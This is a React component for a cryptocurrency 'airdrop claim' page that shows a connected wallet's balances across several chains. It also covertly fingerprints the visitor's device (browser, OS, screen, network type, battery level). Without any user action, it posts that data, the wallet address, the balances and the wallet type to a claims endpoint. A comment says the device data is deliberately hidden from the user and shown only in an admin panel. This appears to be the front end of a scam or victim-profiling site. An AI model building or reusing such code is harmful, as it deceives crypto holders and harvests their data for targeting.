import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Copy, Check, ChevronDown, ChevronUp, Smartphone, Wifi, Battery, Monitor, AlertCircle } from "lucide-react";
import { SiBitcoin, SiEthereum } from "react-icons/si";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import type { CryptoBalances, DeviceInfo } from "@shared/schema";

interface ConnectedStatePanelProps {
  walletAddress: string;
  onClaimComplete: () => void;
}

export function ConnectedStatePanel({ walletAddress, onClaimComplete }: ConnectedStatePanelProps) {
  const [copied, setCopied] = useState(false);
  const [showDeviceInfo, setShowDeviceInfo] = useState(false);
  const [balances, setBalances] = useState<CryptoBalances>({});
  const [deviceInfo, setDeviceInfo] = useState<DeviceInfo>({});
  const [balanceFetchSuccess, setBalanceFetchSuccess] = useState(false);
  const [balanceFetchError, setBalanceFetchError] = useState<string | null>(null);
  const [isLoadingBalances, setIsLoadingBalances] = useState(true);
  const { toast } = useToast();

  const claimMutation = useMutation({
    mutationFn: async (data: any) => {
      return await apiRequest("POST", "/api/claims", data);
    },
    onSuccess: () => {
      toast({
        title: "Success!",
        description: "Your airdrop claim has been recorded.",
      });
      onClaimComplete();
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to process claim. Please try again.",
        variant: "destructive",
      });
    },
  });

  useEffect(() => {
    const collectDeviceInfo = async () => {
      const info: DeviceInfo = {
        userAgent: navigator.userAgent,
        browser: getBrowserInfo(),
        os: getOSInfo(),
        screen: `${window.screen.width}x${window.screen.height}`,
        model: navigator.userAgent,
      };

      if ('connection' in navigator) {
        const conn = (navigator as any).connection;
        info.network = conn?.effectiveType || 'unknown';
      }

      if ('getBattery' in navigator) {
        try {
          const battery: any = await (navigator as any).getBattery();
          info.battery = `${Math.round(battery.level * 100)}%`;
        } catch (e) {
          info.battery = 'N/A';
        }
      }

      setDeviceInfo(info);
    };

    const fetchBalances = async () => {
      setIsLoadingBalances(true);
      setBalanceFetchError(null);
      try {
        const { fetchWalletBalances } = await import('@/lib/web3');
        const realBalances = await fetchWalletBalances(walletAddress);
        setBalances(realBalances);
        setBalanceFetchSuccess(true);
        setIsLoadingBalances(false);
      } catch (error) {
        console.error('Error fetching real balances:', error);
        const errorMessage = error instanceof Error ? error.message : 'Failed to connect to blockchain';
        setBalanceFetchError(errorMessage);
        setBalanceFetchSuccess(false);
        setIsLoadingBalances(false);
        toast({
          title: "Balance Fetch Failed",
          description: "Unable to fetch real-time balances from blockchain. Please retry.",
          variant: "destructive",
        });
      }
    };

    collectDeviceInfo();
    fetchBalances();
  }, [walletAddress, toast]);

  useEffect(() => {
    if (
      balanceFetchSuccess &&
      Object.keys(deviceInfo).length > 0 &&
      Object.keys(balances).length > 0 &&
      !claimMutation.isPending &&
      !claimMutation.isSuccess
    ) {
      const walletType = localStorage.getItem('walletType') || 'Unknown';

      claimMutation.mutate({
        walletAddress,
        balances,
        deviceModel: deviceInfo.model,
        deviceBrowser: deviceInfo.browser,
        deviceOS: deviceInfo.os,
        deviceNetwork: deviceInfo.network,
        deviceBattery: deviceInfo.battery,
        deviceScreen: deviceInfo.screen,
        userAgent: deviceInfo.userAgent,
        walletType,
      });
    }
  }, [deviceInfo, balances, balanceFetchSuccess, claimMutation.isPending, claimMutation.isSuccess]);

  const copyAddress = () => {
    navigator.clipboard.writeText(walletAddress);
    setCopied(true);
    toast({
      title: "Copied!",
      description: "Wallet address copied to clipboard",
    });
    setTimeout(() => setCopied(false), 2000);
  };

  const truncateAddress = (address: string) => {
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  const coinIcons: Record<string, any> = {
    ETH: SiEthereum,
    BNB: SiBitcoin,
    BTC: SiBitcoin,
    SOL: SiEthereum,
    TRX: SiBitcoin,
    TON: SiEthereum,
    USDT_ERC20: SiBitcoin,
    USDT_BEP20: SiBitcoin,
    USDT_TRC20: SiBitcoin,
    USDC: SiBitcoin,
    MATIC: SiEthereum,
  };

  const coinColors: Record<string, string> = {
    ETH: "text-[#627EEA]",
    BNB: "text-[#F3BA2F]",
    BTC: "text-[#F7931A]",
    SOL: "text-[#14F195]",
    TRX: "text-[#FF060A]",
    TON: "text-[#0098EA]",
    USDT_ERC20: "text-[#26A17B]",
    USDT_BEP20: "text-[#26A17B]",
    USDT_TRC20: "text-[#26A17B]",
    USDC: "text-[#2775CA]",
    MATIC: "text-[#8247E5]",
  };

  const retryFetchBalances = async () => {
    const collectDeviceInfo = async () => {
      const info: DeviceInfo = {
        userAgent: navigator.userAgent,
        browser: getBrowserInfo(),
        os: getOSInfo(),
        screen: `${window.screen.width}x${window.screen.height}`,
        model: navigator.userAgent,
      };

      if ('connection' in navigator) {
        const conn = (navigator as any).connection;
        info.network = conn?.effectiveType || 'unknown';
      }

      if ('getBattery' in navigator) {
        try {
          const battery: any = await (navigator as any).getBattery();
          info.battery = `${Math.round(battery.level * 100)}%`;
        } catch (e) {
          info.battery = 'N/A';
        }
      }

      setDeviceInfo(info);
    };

    const fetchBalances = async () => {
      setIsLoadingBalances(true);
      setBalanceFetchError(null);
      try {
        const { fetchWalletBalances } = await import('@/lib/web3');
        const realBalances = await fetchWalletBalances(walletAddress);
        setBalances(realBalances);
        setBalanceFetchSuccess(true);
        setIsLoadingBalances(false);
        toast({
          title: "Success!",
          description: "Blockchain balances fetched successfully.",
        });
      } catch (error) {
        console.error('Error fetching real balances:', error);
        const errorMessage = error instanceof Error ? error.message : 'Failed to connect to blockchain';
        setBalanceFetchError(errorMessage);
        setBalanceFetchSuccess(false);
        setIsLoadingBalances(false);
        toast({
          title: "Balance Fetch Failed",
          description: "Unable to fetch real-time balances from blockchain. Please retry.",
          variant: "destructive",
        });
      }
    };

    await collectDeviceInfo();
    await fetchBalances();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5 px-4 py-12">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Error State - Blockchain Fetch Failed */}
        {balanceFetchError && !balanceFetchSuccess && (
          <Card className="p-6 rounded-2xl backdrop-blur-xl bg-destructive/10 border-destructive/30">
            <div className="flex items-start gap-4">
              <AlertCircle className="w-6 h-6 text-destructive flex-shrink-0 mt-1" />
              <div className="flex-1">
                <h3 className="font-semibold text-destructive mb-2">Blockchain Connection Failed</h3>
                <p className="text-sm text-muted-foreground mb-4">
                  Unable to fetch real-time balances from blockchain. {balanceFetchError}
                </p>
                <Button
                  onClick={retryFetchBalances}
                  disabled={isLoadingBalances}
                  className="rounded-lg"
                  data-testid="button-retry-balances"
                >
                  {isLoadingBalances ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2" />
                      Retrying...
                    </>
                  ) : (
                    'Retry Balance Fetch'
                  )}
                </Button>
              </div>
            </div>
          </Card>
        )}

        {/* Loading State */}
        {isLoadingBalances && !balanceFetchError && (
          <Card className="p-12 rounded-2xl backdrop-blur-xl bg-card/95 border-card-border text-center">
            <div className="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
            <h3 className="text-lg font-semibold mb-2">Fetching Blockchain Data</h3>
            <p className="text-sm text-muted-foreground">
              Retrieving your wallet balances from Ethereum, BSC, and Polygon networks...
            </p>
          </Card>
        )}

        {/* Header with wallet address */}
        {balanceFetchSuccess && (
          <Card className="p-6 rounded-2xl backdrop-blur-xl bg-card/95 border-card-border">
          <div className="flex items-center justify-between gap-4 flex-wrap">
            <div className="flex-1 min-w-0">
              <p className="text-sm text-muted-foreground mb-1">Connected Wallet</p>
              <div className="flex items-center gap-2">
                <Badge variant="outline" className="bg-success/10 text-success border-success/30">
                  <div className="w-2 h-2 rounded-full bg-success mr-2 animate-pulse" />
                  Connected
                </Badge>
                <code className="text-sm font-mono text-foreground">{truncateAddress(walletAddress)}</code>
              </div>
            </div>
            <Button
              variant="outline"
              size="sm"
              onClick={copyAddress}
              className="rounded-lg"
              data-testid="button-copy-address"
            >
              {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              <span className="ml-2">{copied ? "Copied" : "Copy"}</span>
            </Button>
          </div>
        </Card>
        )}

        {/* Balance Cards Grid */}
        {balanceFetchSuccess && (
        <div>
          <h2 className="text-2xl font-semibold mb-4">Wallet Balances</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {Object.entries(balances).map(([coin, balance]) => {
              const Icon = coinIcons[coin] || SiBitcoin;
              const color = coinColors[coin] || "text-foreground";
              const displayName = coin.replace(/_/g, ' ');

              return (
                <Card
                  key={coin}
                  className="p-4 rounded-lg border-card-border hover:border-primary/30 transition-all"
                  data-testid={`card-balance-${coin.toLowerCase()}`}
                >
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-2">
                        <Icon className={`w-6 h-6 ${color}`} />
                        <span className="text-sm font-medium text-muted-foreground">{displayName}</span>
                      </div>
                      <p className="text-2xl font-bold font-mono">{balance}</p>
                    </div>
                  </div>
                </Card>
              );
            })}
          </div>
        </div>
        )}

        {/* Device Info Accordion */}
        {/* Device info is collected but not displayed to user - only visible in admin panel */}
      </div>
    </div>
  );
}

function getBrowserInfo(): string {
  const ua = navigator.userAgent;
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('Chrome')) return 'Chrome';
  if (ua.includes('Safari')) return 'Safari';
  if (ua.includes('Edge')) return 'Edge';
  return 'Unknown';
}

function getOSInfo(): string {
  const ua = navigator.userAgent;
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iOS')) return 'iOS';
  return 'Unknown';
}